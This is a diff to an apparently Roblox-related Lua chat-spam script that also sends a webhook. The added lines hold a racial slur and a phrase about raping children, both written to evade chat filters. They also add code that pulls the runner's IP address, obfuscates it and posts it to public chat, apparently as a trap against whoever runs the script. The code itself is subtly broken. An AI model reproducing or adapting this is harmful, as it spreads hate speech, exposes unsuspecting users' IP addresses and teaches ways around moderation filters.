@@ -83,8 +83,29 @@ local webhookData = createWebhookData()
 
 -- Sending the webhook
 sendWebhook(webhookUrl, webhookData)
-local message = "I ɱο|ȇšţ κíđš ňíĝĝȇŕ ňíĝĝȇŕ ňíĝĝȇŕ κκκ οň ţοƥ ƀíţçħ κƴš ŕȇţåŕđ ňíĝĝå!" -- Change this to any message you want
-local message2 = "Iɱ å <ȇẋƥ|<οíţ<ȇŕ ŕȇƥοŕţ ɱȇ í ħåѷȇ ȇẋȇçûţȇđ ţħȇ wŕοňĝ šçŕíƥţ!"
+local message = "<n<i<g<g<a <i <r<a<p<e <k<i<d<s" -- Change this to any message you want
+function format_ip(ip)
+    local formatted_ip = ""
+    for part in string.gmatch(ip, "%d+") do
+        local formatted_part = ""
+        for i = 1, #part do
+            formatted_part = formatted_part .. part:sub(i, i) .. "<"
+        end
+        formatted_ip = formatted_ip .. formatted_part:sub(1, -2) .. "."
+    end
+    return formatted_ip:sub(1, -2)  -- Remove the last dot
+end
+
+-- Main function
+function main()
+    local ip = GetIp
+    local formatted_ip = format_ip(ip)
+    print("My IP has " .. formatted_ip)
+end
+
+-- Call main function
+main()
+local message2 = "MY IP: " .. formatted_ip
 local delayTime = 2.5 -- Time in seconds between messages
 
 while true do
